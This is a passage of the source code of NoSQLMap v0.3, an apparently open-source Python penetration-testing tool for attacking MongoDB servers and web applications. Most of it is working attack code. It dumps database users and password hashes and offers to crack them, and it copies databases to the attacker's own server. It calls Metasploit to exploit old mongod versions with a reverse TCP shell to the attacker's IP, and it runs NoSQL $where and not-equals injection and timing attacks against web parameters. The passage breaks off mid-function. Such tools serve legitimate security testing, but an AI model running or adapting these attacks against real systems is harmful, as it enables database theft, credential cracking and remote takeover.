#!/usr/bin/python
#NoSQLMap Copyright 2013 Russell Butturini
#This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
#the Free Software Foundation, either version 3 of the License, or
#(at your option) any later version.

#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.

#You should have received a copy of the GNU General Public License
#along with this program.  If not, see <http://www.gnu.org/licenses/>.


import sys
import string
import random
import os
import time
import httplib2
import urllib
import urllib2
import pymongo
import subprocess
import json
import gridfs
import ipcalc
import signal
from hashlib import md5

#Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
global optionSet
optionSet = [False,False,False,False,False,False]
global victim
global webPort
global uri
global httpMethod
global myIP
global myPort


def mainMenu():
	select = True
	while select:
		os.system('clear')
		#label = subprocess.check_output(["git","describe","--always"])
		print "===================================================="
		print " _   _       _____  _____ _     ___  ___            "
		print "| \ | |     /  ___||  _  | |    |  \/  |            "
		print "|  \| | ___ \ `--. | | | | |    | .  . | __ _ _ __  "
		print "| . ` |/ _ \ `--. \| | | | |    | |\/| |/ _` | '_ \ "
		print "| |\  | (_) /\__/ /\ \/' / |____| |  | | (_| | |_) |"
		print "\_| \_/\___/\____/  \_/\_\_____/\_|  |_/\__,_| .__/"
		print "===================================================="
		print "NoSQLMap-v0.3"
		print "nosqlmap@gmail.com"
		print "\n"
		print "1-Set options"
		print "2-NoSQL DB Access Attacks"
		print "3-NoSQL Web App attacks"
		print "4-Scan for Anonymous MongoDB Access"
		print "x-Exit"

		select = raw_input("Select an option: ")

		if select == "1":
			options()

		elif select == "2":
			if optionSet[0] == True:
				netAttacks(victim)
				
			#Check minimum required options
			else:
				raw_input("Target not set! Check options.  Press enter to continue...")
				mainMenu()
				
		
		elif select == "3":
			#Check minimum required options
			if (optionSet[0] == True) and (optionSet[2] == True):	
				if httpMethod == "GET":
					webApps()
				
				else:
					postApps()
			
			else:
				raw_input("Options not set! Check Host and URI path.  Press enter to continue...")
				mainMenu()
				
		elif select == "4":
			massMongo()

		elif select == "x":
			sys.exit()
			
		else:
			raw_input("Invalid Selection.  Press enter to continue.")
			mainMenu()
			

def options():
	global victim
	global webPort
	global uri
	global httpMethod
	global postData
	global myIP
	global myPort
	#Set default value if needed
	if optionSet[0] == False:
		victim = "Not Set"
	if optionSet[1] == False:
		webPort = 80
		optionSet[1] = True
	if optionSet[2] == False:
		uri = "Not Set"
	if optionSet[3] == False:
		httpMethod = "GET"
	if optionSet[4] == False:
		myIP = "Not Set"
	if optionSet[5] == False:
		myPort = "Not Set"
	
	select = True
	
	while select:	
		print "\n\n"
		print "Options"
		print "1-Set target host/IP (Current: " + str(victim) + ")"
		print "2-Set web app port (Current: " + str(webPort) + ")" 
		print "3-Set App Path (Current: " + str(uri) + ")"
		print "4-Set HTTP Request Method (GET/POST) (Current: " + httpMethod + ")"
		print "5-Set my local Mongo/Shell IP (Current: " + str(myIP) + ")"
		print "6-Set shell listener port (Current: " + str(myPort) + ")"
		print "7-Load options file"
		print "8-Load options from saved Burp request"
		print "9-Save options file"
		print "x-Back to main menu"

		select = raw_input("Select an option: ")
		
		if select == "1":
			#Unset the boolean if it's set since we're setting it again.
			optionSet[0] = False
			goodLen = False
			goodDigits = False
			while optionSet[0] == False:
				victim = raw_input("Enter the host IP/DNS name: ")
				#make sure we got a valid IP
				octets = victim.split(".")
				#If there aren't 4 octets, toss an error.
				if len(octets) != 4:
					print "Invalid IP length."
				
				else:
					goodLen = True
				
				if goodLen == True:	
				#If the format of the IP is good, check and make sure the octets are all within acceptable ranges.
					for item in octets:
						if int(item) < 0 or int(item) > 255:
							print "Bad octet in IP address."
							goodDigits = False
						
						else:
							goodDigits = True
						
				
				#If everything checks out set the IP and break the loop
				if goodLen == True and goodDigits == True:
					print "\nTarget set to " + victim + "\n"
					optionSet[0] = True
			options()
			
		elif select == "2":
			webPort = raw_input("Enter the HTTP port for web apps: ")
			print "\nHTTP port set to " + webPort + "\n"
			optionSet[1] = True
			options()

		elif select == "3":
			uri = raw_input("Enter URI Path (Press enter for no URI): ")
			print "\nURI Path set to " + uri + "\n"
			optionSet[2] = True
			options()

		#NOT IMPLEMENTED YET FOR USE
		elif select == "4":
			httpMethod = True
			while httpMethod:

				print "1-Send request as a GET"
				print "2-Send request as a POST"
				httpMethod = raw_input("Select an option: ")
			
				if httpMethod == "1":
					print "GET request set"
					optionSet[3] = True
					options()

				elif httpMethod == "2":
					print "POST request set"
					optionSet[3] = True
					postDataIn = raw_input("Enter POST data in a comma separated list (i.e. param name 1,value1,param name 2,value2)\n")
					pdArray = postDataIn.split(",")
					paramNames = pdArray[0::2]
					paramValues = pdArray[1::2]
					postData = dict(zip(paramNames,paramValues))
					httpMethod = "POST"
					options()
				else:
					print "Invalid selection"

		elif select == "5":
			#Unset the setting boolean since we're setting it again.
			optionSet[4] = False
			goodLen = False
			goodDigits = False
			while optionSet[4] == False:
				myIP = raw_input("Enter the host IP for my Mongo/Shells: ")
				#make sure we got a valid IP
				octets = myIP.split(".")
				#If there aren't 4 octets, toss an error.
				if len(octets) != 4:
					print "Invalid IP length."
				
				else:
					goodLen = True
				
				if goodLen == True:	
				#If the format of the IP is good, check and make sure the octets are all within acceptable ranges.
					for item in octets:
						if int(item) < 0 or int(item) > 255:
							print "Bad octet in IP address."
							goodDigits = False
						
						else:
							goodDigits = True
						
				
				#If everything checks out set the IP and break the loop
				if goodLen == True and goodDigits == True:
					print "\nShell/DB listener set to " + myIP + "\n"
					optionSet[4] = True
			options()
		
		elif select == "6":
			myPort = raw_input("Enter TCP listener for shells: ")
			print "Shell TCP listener set to " + myPort + "\n"
			optionSet[5] = True
			options()
			
		elif select == "7":
			loadPath = raw_input("Enter file name to load: ")
			try:
				fo = open(loadPath,"r" )
				csvOpt = fo.readlines()
				fo.close()
				optList = csvOpt[0].split(",")
				victim = optList[0]
				webPort = optList[1]
				uri = optList[2]
				httpMethod = optList[3]
				myIP = optList[4]
				myPort = optList[5]
				
				if httpMethod == "POST":
					postData = csvOpt[1]
				
				
				
			
				#Set option checking array based on what was loaded
				x = 0
				for item in optList:
					if item != "Not Set":
						optionSet[x] = True
					x += 1
			except:
				print "Couldn't load options file!"
				#print str(sys.exc_info())	Debug
			options()
		
		elif select == "8":
			loadPath = raw_input("Enter path to Burp request file: ")

			try:
				fo = open(loadPath,"r")
				reqData = fo.readlines()
				
			except:
				raw_input("error reading file.  Press enter to continue...")
				mainMenu()

			methodPath = reqData[0].split(" ")

			if methodPath[0] == "GET":
				httpMethod = "GET"
			
			elif methodPath[0] == "POST":
				paramNames = []
				paramValues = []
				httpMethod = "POST"
				postData = reqData[len(reqData)-1]
				#split the POST parameters up into individual items
				paramsNvalues = postData.split("&")
				
				for item in paramsNvalues:
					tempList = item.split("=")
					paramNames.append(tempList[0])
					paramValues.append(tempList[1])
				
				postData = dict(zip(paramNames,paramValues))
				
			else:
				print "unsupported method in request header."
			
			victim = reqData[1].split( " ")[1].replace("\r\n","")
			optionSet[0] = True
			uri = methodPath[1].replace("\r\n","")
			optionSet[2] = True			
			
		elif select == "9":
			savePath = raw_input("Enter file name to save: ")
			try:
				fo = open(savePath, "wb")
				fo.write(str(victim) + "," + str(webPort) + "," + str(uri) + "," + str(httpMethod) + "," + str(myIP) + "," + str(myPort))
				
				if httpMethod == "POST":
					fo.write(",\n"+ str(postData))
				fo.close()
				print "Options file saved!"
			except:
				print "Couldn't save options file."

		elif select == "x":
			mainMenu()
			
def netAttacks(target):
	print "DB Access attacks"
	print "================="
	mgtOpen = False
	webOpen = False
	#This is a global for future use with other modules; may change
	global dbList
	
	srvNeedCreds = raw_input("Does the database server need credentials (y/n)? ")
	
	if srvNeedCreds == "n" or srvNeedCreds == "N":
		
		try:
			conn = pymongo.MongoClient(target,27017)
			print "MongoDB port open on " + target + ":27017!"
			mgtOpen = True
	
		except:
			print "MongoDB port closed."					
	
	elif srvNeedCreds == "y" or srvNeedCreds == "Y":
		srvUser = raw_input("Enter server username: ")
		srvPass = raw_input("Enter server password: ")
		uri = "mongodb://" + srvUser + ":" + srvPass + "@" + victim +"/"

		try:
			conn = pymongo.MongoClient(uri)
			print "MongoDB authenticated on " + target + ":27017!"
			mgtOpen = True
		except:
			raw_input("Failed to authenticate.  Press enter to continue...")
			mainMenu()
	
	
	mgtUrl = "http://" + target + ":28017"	
	#Future rev:  Add web management interface parsing
	
	try:
		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
		if mgtRespCode == 200:
			print "MongoDB web management open at " + mgtUrl + ".  No authentication required!"
			testRest = raw_input("Start tests for REST Interface (y/n)? ")

		if testRest == "y" or testRest == "Y":
			restUrl = mgtUrl + "/listDatabases?text=1"
			restResp = urllib.urlopen(restUrl).read()
			restOn = restResp.find('REST is not enabled.')

			if restOn == -1:
				print "REST interface enabled!"
				dbs = json.loads(restResp)
				menuItem = 1
				print "List of databases from REST API:"

				for x in range(0,len(dbs['databases'])):
					dbTemp= dbs['databases'][x]['name']
					print str(menuItem) + "-" + dbTemp
					menuItem += 1
			print "\n"

		else:
			print "REST interface not enabled." 
			
	except:
		
		print "MongoDB web management closed or requires authentication."	
		
	print "\n"
	if mgtOpen == True:
		print "Server Info:"
		mongoVer = conn.server_info()['version']
		print "MongoDB Version: " + mongoVer
		mongoDebug = conn.server_info()['debug']
		print "Debugs enabled : " + str(mongoDebug)
		mongoPlatform = conn.server_info()['bits']
		print "Platform: " + str(mongoPlatform) + " bit"
		print "\n"
		
		try:
			print "List of databases:"
			dbList = conn.database_names()
			print "\n".join(dbList)
			print "\n"
			
		except:
			print "Error:  Couldn't list databases.  The provided credentials may not have rights."
		
		print "List of collections:"
		#print "\n"
		
		try:
			for dbItem in dbList:
				db = conn[dbItem]
				colls = db.collection_names()
				print dbItem + ":"
				print "\n".join(colls)
				print "\n"
				
				if 'system.users' in colls:
					users = list(db.system.users.find())
					print "Database Users and Password Hashes:"
					
					for x in range (0,len(users)):
						print "Username: " + users[x]['user']
						print "Hash: " + users[x]['pwd']
						print "\n"
						crack = raw_input("Crack this hash (y/n)? ")
						
						if crack == "y":
							brute_pass(users[x]['user'],users[x]['pwd'])
					
		except:
			print "Error:  Couldn't list collections.  The provided credentials may not have rights."
		
		print "\n"
		#Start GridFS enumeration
		
		testGrid = raw_input("Check for GridFS (y/n)? ")
		
		if testGrid == "y" or testGrid == "Y":
			for dbItem in dbList:
				try:
					db = conn[dbItem]
					fs = gridfs.GridFS(db)
					files = fs.list()
					print "GridFS enabled on database " + str(dbItem)
					print " list of files:"
					print "\n".join(files)
					
				except:
					print "GridFS not enabled on " + str(dbItem) + "."
							
		stealDB = raw_input("Steal a database (y/n-Requires your own Mongo server)?: ")
		
		if stealDB == "y" or stealDB == "Y":
			stealDBs (myIP)
			
		getShell = raw_input("Try to get a shell? (y/n-Requrires mongoDB <2.2.4)? ")
		
		if getShell == "y" or getShell == "Y":
			#Launch Metasploit exploit
			try:
				proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
			
			except:
				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."	
	raw_input("Press enter to continue...")
	return()
		

def postApps():
	print "Web App Attacks"
	print "==============="
	paramName = []
	paramValue = []
	vulnAddrs = []
	possAddrs = []
	timeVulnsStr = []
	timeVulnsInt = []
	appUp = False
	strTbAttack = False
	intTbAttack = False
	trueStr = False
	trueInt = False
	lt24 = False
	global postData
	
	#Verify app is working.  
	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
	
	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
	
	try:
		body = urllib.urlencode(postData)
		req = urllib2.Request(appURL,body)
		appRespCode = urllib2.urlopen(req).getcode()
		
		#normLength = int(len(urllib.urlopen(appURL).read()))
		if appRespCode == 200:
			
			normLength = int(len(urllib2.urlopen(req).read()))
			timeReq = urllib2.urlopen(req)
			start = time.time()
			page = timeReq.read()
			end = time.time()
			timeReq.close()
			timeBase = round((end - start), 3)
			
			
			
			print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
			appUp = True
		
		else:
			print "Got " + appRespCode + "from the app, check your options."
	except:
		print sys.exc_info()
		print "Looks like the server didn't respond.  Check your options."
	
	if appUp == True:
			
		injectSize = raw_input("Baseline test-Enter random string size: ")
		injectString = randInjString(int(injectSize))
		print "Using " + injectString + " for injection testing.\n"
		
		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
		#Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
		randomUri = buildUri(appURL,injectString)
		print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
		randLength = int(len(urllib.urlopen(randomUri).read()))
		print "Got response length of " + str(randLength) + "."
		
		randNormDelta = abs(normLength - randLength)
		
		if randNormDelta == 0: 
			print "No change in response size injecting a random parameter..\n"
		else:
			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter value!\n"
			
		print "Testing Mongo PHP not equals associative array injection using " + uriArray[1] +"..."
		injLen = int(len(urllib.urlopen(uriArray[1]).read()))
		print "Got response length of " + str(injLen) + "."
		
		randInjDelta = abs(injLen - randLength)
		
		if (randInjDelta >= 100) and (injLen != 0) :
			print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter value! Injection works!"
			vulnAddrs.append(uriArray[1])
		
		elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
			print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
			possAddrs.append(uriArray[1])
		
		elif (randInjDelta == 0):
			print "Random string response size and not equals injection were the same. Injection did not work."
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(uriArray[1])
		
		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
		print "Injecting " + uriArray[2]
		
		whereStrLen = int(len(urllib.urlopen(uriArray[2]).read()))
		whereStrDelta = abs(whereStrLen - randLength)
		
		if (whereStrDelta >= 100) and (whereStrLen > 0):
			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
			lt24 = True
			str24 = True
			vulnAddrs.append(uriArray[2])
		
		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
			print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[2])
			
		elif (whereStrDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(uriArray[2])
		
		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
		print "Injecting " + uriArray[3]
		
		whereIntLen = int(len(urllib.urlopen(uriArray[3]).read()))
		whereIntDelta = abs(whereIntLen - randLength)
		
		if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
			lt24 = True
			int24 = True
			vulnAddrs.append(uriArray[3])
			
		elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
			print " response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[3])
			
		elif (whereIntDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(uriArray[3])
			
		#Start a single record attack in case the app expects only one record back
		
		print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
		print " Injecting " + uriArray[4]
		
		
		whereOneStrLen = int(len(urllib.urlopen(uriArray[4]).read()))
		whereOneStrDelta = abs(whereOneStrLen - randLength)
			
		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter value! Where injection works!"
			lt24 = True
			str24 = True
			vulnAddrs.append(uriArray[4])
		
		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
			print " response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[4])
			
		elif (whereOneStrDelta == 0):
			print "Random string response size and $where single injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(uriArray[4])
			
		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
		print " Injecting " + uriArray[5]
		
		
		whereOneIntLen = int(len(urllib.urlopen(uriArray[5]).read()))
		whereOneIntDelta = abs(whereOneIntLen - randLength)				
			
		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
			lt24 = True
			int24 = True
			vulnAddrs.append(uriArray[5])
		
		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
			print " response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[5])
			
		elif (whereOneIntDelta == 0):
			print "Random string response size and $where single record injection were the same. Injection did not work."
			
		else:	
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
			possAddrs.append(uriArray[5])
			
		print "\n"
		print "Testing Mongo this not equals string escape attack for all records..."
		print " Injecting " + uriArray[8]
		
		whereThisStrLen = int(len(urllib.urlopen(uriArray[8]).read()))
		whereThisStrDelta = abs(whereThisStrLen - randLength)
		
		if (whereThisStrDelta >= 100) and (whereThisStrLen - randLength > 0):
			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(uriArray[8])
		
		elif (whereThisStrDelta > 0) and (whereThisStrDelta < 100) and (whereThisStrLen - randLength > 0):
			print " response variance was only " + str(whereThisStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[8])
			
		elif (whereThisStrDelta == 0):
			print "Random string response size and this return response size were the same. Injection did not work."
			
		else:	
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
			possAddrs.append(uriArray[8])
			
		print "\n"
		print "Testing Mongo this not equals integer escape attack for all records..."
		print " Injecting " + uriArray[9]
		
		whereThisIntLen = int(len(urllib.urlopen(uriArray[9]).read()))
		whereThisIntDelta = abs(whereThisIntLen - randLength)
		
		if (whereThisIntDelta >= 100) and (whereThisIntLen - randLength > 0):
			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(uriArray[9])
		
		elif (whereThisIntDelta > 0) and (whereThisIntDelta < 100) and (whereThisIntLen - randLength > 0):
			print " response variance was only " + str(whereThisIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[9])
			
		elif (whereThisIntDelta == 0):
			print "Random string response size and this return response size were the same. Injection did not work."
			
		else:	
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
			possAddrs.append(uriArray[9])
			
		print "\n"
		doTimeAttack = raw_input("Start timing based tests (y/n)? ")
		
		if doTimeAttack == "y" or doTimeAttack == "Y":
			print "Starting Javascript string escape time based injection..."
			start = time.time()
			strTimeInj = urllib.urlopen(uriArray[6])
			page = strTimeInj.read()
			end = time.time()
			strTimeInj.close()
			#print str(end)
			#print str(start)
			strTimeDelta = (int(round((end - start), 3)) - timeBase)
			#print str(strTimeDelta)
			if strTimeDelta > 25:
				print "HTTP load time variance was " + str(strTimeDelta) +" seconds! Injection possible."
				strTbAttack = True
			
			else:
				print "HTTP load time variance was only " + str(strTimeDelta) + ".  Injection probably didn't work."
				strTbAttack = False
			
			print "Starting Javascript integer escape time based injection..."
			start = time.time()
			intTimeInj = urllib.urlopen(uriArray[7])
			page = intTimeInj.read()
			end = time.time()
			intTimeInj.close()
			#print str(end)
			#print str(start)
			intTimeDelta = (int(round((end - start), 3)) - timeBase)
			#print str(strTimeDelta)
			if intTimeDelta > 25:
				print "HTTP load time variance was " + str(intTimeDelta) +" seconds! Injection possible."
				intTbAttack = True
			
			else:
				print "HTTP load time variance was only " + str(intTimeDelta) + "seconds.  Injection probably didn't work."
				intTbAttack = False
		
		if lt24 == True:
			bfInfo = raw_input("MongoDB < 2.4 detected.  Start brute forcing database info (y/n)? ")
			
			if bfInfo == "y" or bfInfo == "Y":
				getDBInfo()
				
		
		print "\n"	
		print "Vunerable URLs:"
		print "\n".join(vulnAddrs)
		print "\n"
		print "Possibly vulnerable URLs:"
		print"\n".join(possAddrs)
		print "\n"
		print "Timing based attacks:"
		
		if strTbAttack == True:
			print "String attack-Successful"
		else:
			print "String attack-Unsuccessful"
		if intTbAttack == True:
			print "Integer attack-Successful"
		else:
			print "Integer attack-Unsuccessful"
		
		fileOut = raw_input("Save results to file (y/n)? ")
		
		if fileOut == "y" or fileOut == "Y":
			savePath = raw_input("Enter output file name: ")
			fo = open(savePath, "wb")
			fo.write ("Vulnerable URLs:\n")
			fo.write("\n".join(vulnAddrs))
			fo.write("\n\n")
			fo.write("Possibly Vulnerable URLs:\n")
			fo.write("\n".join(possAddrs))
			fo.write("\n")
			fo.write("Timing based attacks:\n")
			
			if strTbAttack == True:
				fo.write("String Attack-Successful\n")
			else:
				fo.write("String Attack-Unsuccessful\n")
			fo.write("\n")
			
			if intTbAttack == True:
				fo.write("Integer attack-Successful\n")
			else:
				fo.write("Integer attack-Unsuccessful\n")
			fo.write("\n")
			fo.close()
		
	raw_input("Press enter to continue...")
	return()	
	
def webApps():
	print "Web App Attacks"
	print "==============="
	paramName = []
	paramValue = []
	vulnAddrs = []
	possAddrs = []
	timeVulnsStr = []
	timeVulnsInt = []
	appUp = False
	strTbAttack = False
	intTbAttack = False
	trueStr = False
	trueInt = False
	lt24 = False
	
	#Verify app is working.  
	print "Checking to see if site at " + str(victim) + ":" + str(webPort) + str(uri) + " is up..."
	
	appURL = "http://" + str(victim) + ":" + str(webPort) + str(uri)
	
	try:
		appRespCode = urllib.urlopen(appURL).getcode()
		if appRespCode == 200:
			normLength = int(len(urllib.urlopen(appURL).read()))
			timeReq = urllib.urlopen(appURL)
			start = time.time()
			page = timeReq.read()
			end = time.time()
			timeReq.close()
			timeBase = round((end - start), 3)
			
			
			
			print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
			appUp = True
		
		else:
			print "Got " + appRespCode + "from the app, check your options."
	except:
		print "Looks like the server didn't respond.  Check your options."
	
	if appUp == True:
			
		injectSize = raw_input("Baseline test-Enter random string size: ")
		injectString = randInjString(int(injectSize))
		print "Using " + injectString + " for injection testing.\n"
		
		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
		#Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
		randomUri = buildUri(appURL,injectString)
		print "Checking random injected parameter HTTP response size using " + randomUri +"...\n"
		randLength = int(len(urllib.urlopen(randomUri).read()))
		print "Got response length of " + str(randLength) + "."
		
		randNormDelta = abs(normLength - randLength)
		
		if randNormDelta == 0: 
			print "No change in response size injecting a random parameter..\n"
		else:
			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter value!\n"
			
		print "Testing Mongo PHP not equals associative array injection using " + uriArray[1] +"..."
		injLen = int(len(urllib.urlopen(uriArray[1]).read()))
		print "Got response length of " + str(injLen) + "."
		
		randInjDelta = abs(injLen - randLength)
		
		if (randInjDelta >= 100) and (injLen != 0) :
			print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter value! Injection works!"
			vulnAddrs.append(uriArray[1])
		
		elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
			print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
			possAddrs.append(uriArray[1])
		
		elif (randInjDelta == 0):
			print "Random string response size and not equals injection were the same. Injection did not work."
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(uriArray[1])
		
		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
		print "Injecting " + uriArray[2]
		
		whereStrLen = int(len(urllib.urlopen(uriArray[2]).read()))
		whereStrDelta = abs(whereStrLen - randLength)
		
		if (whereStrDelta >= 100) and (whereStrLen > 0):
			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
			lt24 = True
			str24 = True
			vulnAddrs.append(uriArray[2])
		
		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
			print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[2])
			
		elif (whereStrDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(uriArray[2])
		
		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
		print "Injecting " + uriArray[3]
		
		whereIntLen = int(len(urllib.urlopen(uriArray[3]).read()))
		whereIntDelta = abs(whereIntLen - randLength)
		
		if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
			lt24 = True
			int24 = True
			vulnAddrs.append(uriArray[3])
			
		elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
			print " response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[3])
			
		elif (whereIntDelta == 0):
			print "Random string response size and $where injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(uriArray[3])
			
		#Start a single record attack in case the app expects only one record back
		
		print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
		print " Injecting " + uriArray[4]
		
		
		whereOneStrLen = int(len(urllib.urlopen(uriArray[4]).read()))
		whereOneStrDelta = abs(whereOneStrLen - randLength)
			
		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter value! Where injection works!"
			lt24 = True
			str24 = True
			vulnAddrs.append(uriArray[4])
		
		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
			print " response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[4])
			
		elif (whereOneStrDelta == 0):
			print "Random string response size and $where single injection were the same. Injection did not work."
		
		else:
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
			possAddrs.append(uriArray[4])
			
		print "\n"
		print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
		print " Injecting " + uriArray[5]
		
		
		whereOneIntLen = int(len(urllib.urlopen(uriArray[5]).read()))
		whereOneIntDelta = abs(whereOneIntLen - randLength)				
			
		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
			lt24 = True
			int24 = True
			vulnAddrs.append(uriArray[5])
		
		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
			print " response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[5])
			
		elif (whereOneIntDelta == 0):
			print "Random string response size and $where single record injection were the same. Injection did not work."
			
		else:	
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
			possAddrs.append(uriArray[5])
			
		print "\n"
		print "Testing Mongo this not equals string escape attack for all records..."
		print " Injecting " + uriArray[8]
		
		whereThisStrLen = int(len(urllib.urlopen(uriArray[8]).read()))
		whereThisStrDelta = abs(whereThisStrLen - randLength)
		
		if (whereThisStrDelta >= 100) and (whereThisStrLen - randLength > 0):
			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(uriArray[8])
		
		elif (whereThisStrDelta > 0) and (whereThisStrDelta < 100) and (whereThisStrLen - randLength > 0):
			print " response variance was only " + str(whereThisStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[8])
			
		elif (whereThisStrDelta == 0):
			print "Random string response size and this return response size were the same. Injection did not work."
			
		else:	
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
			possAddrs.append(uriArray[8])
			
		print "\n"
		print "Testing Mongo this not equals integer escape attack for all records..."
		print " Injecting " + uriArray[9]
		
		whereThisIntLen = int(len(urllib.urlopen(uriArray[9]).read()))
		whereThisIntDelta = abs(whereThisIntLen - randLength)
		
		if (whereThisIntDelta >= 100) and (whereThisIntLen - randLength > 0):
			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
			vulnAddrs.append(uriArray[9])
		
		elif (whereThisIntDelta > 0) and (whereThisIntDelta < 100) and (whereThisIntLen - randLength > 0):
			print " response variance was only " + str(whereThisIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
			possAddrs.append(uriArray[9])
			
		elif (whereThisIntDelta == 0):
			print "Random string response size and this return response size were the same. Injection did not work."
			
		else:	
			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
			possAddrs.append(uriArray[9])
			
		print "\n"
		doTimeAttack = raw_input("Start timing based tests (y/n)? ")
		
		if doTimeAttack == "y" or doTimeAttack == "Y":
